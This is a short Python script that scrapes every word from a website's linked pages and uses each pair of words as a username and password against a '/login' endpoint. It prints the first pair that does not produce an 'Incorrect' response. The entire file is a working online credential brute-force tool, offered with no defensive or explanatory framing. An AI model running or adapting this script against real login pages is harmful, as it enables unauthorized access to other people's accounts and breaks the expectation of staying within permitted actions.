#!/usr/bin/env python
import sys
import string
from bs4 import BeautifulSoup as bs
import requests
import re

usage = "%s <scrape url> <brute url>" % sys.argv[0]

if len(sys.argv) < 3:
    exit(usage)

scrape_base = sys.argv[1]
brute_base = sys.argv[2]

def removepunc(myword):
     exclude = set(string.punctuation)
     if len(myword) > 1:
         if myword[-1] in exclude:
             return myword[:-1]
         else: return myword

patt = re.compile(r'(\w)*')
ppatt = re.compile(r'<p>(.*)</p>')
h3patt = re.compile(r'<h3>(.*)</h3>')

r = requests.get(scrape_base)
soup = bs(r.text)
urls = [link.get('href') for link in soup.find_all('a')]

posts = []
words = set()

for url in urls:
    if url == "#": continue
    r = requests.get(scrape_base + url)
    soup = bs(r.text)
    #posts += soup.find_all('div',class_='post-preview')
    for line in soup.get_text().split('\n'):
        for word in line.split(' '):
            if len(word)>1: words.add(removepunc(word))



"""
for post in posts:
    if post.findAll('h3'):
        username = post.findAll('h3')[0].get_text().encode('ascii').strip()
    if post.findAll('p'):
        users[username] = \
        post.findAll('p')[0].get_text().encode('ascii').strip()
        
for user,text in users.items():
    names = user.split(' ')
    guesses = text.split(' ')
    for name in names:
        users[name] = []
        for guess in guesses:
            if len(guess) > 0:
                if guess[-1] in string.punctuation:
                    guess = guess[:-1]
                users[name].append(guess)
    del users[user]
"""
#for u, d in users.items():
for u in words:
    for guess in words:
        url = brute_base + '/login'
        payload = {'user':u , 'password':guess}
        r = requests.post(url,data=payload)
        if "Incorrect" not in r.text:
            print "%s:%s" % (u,guess)
            exit()
